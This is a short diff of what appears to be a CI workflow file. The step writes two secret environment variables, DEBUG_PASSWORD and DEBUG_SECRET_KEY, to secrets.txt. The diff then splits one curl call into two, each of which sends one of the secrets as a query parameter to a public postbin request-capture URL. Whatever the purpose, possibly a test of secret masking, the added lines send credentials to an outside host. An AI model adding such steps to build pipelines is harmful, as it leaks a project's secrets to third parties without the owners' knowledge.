@@ -17,5 +17,6 @@ jobs:
       run: |
         echo $DEBUG_PASSWORD >> secrets.txt
         echo $DEBUG_SECRET_KEY >> secrets.txt
-        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?a=$DEBUG_PASSWORD&b=$DEBUG_SECRET_KEY
+        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?a=$DEBUG_PASSWORD
+        curl https://www.toptal.com/developers/postbin/1691226180315-6729739962611?b=$DEBUG_SECRET_KEY
     
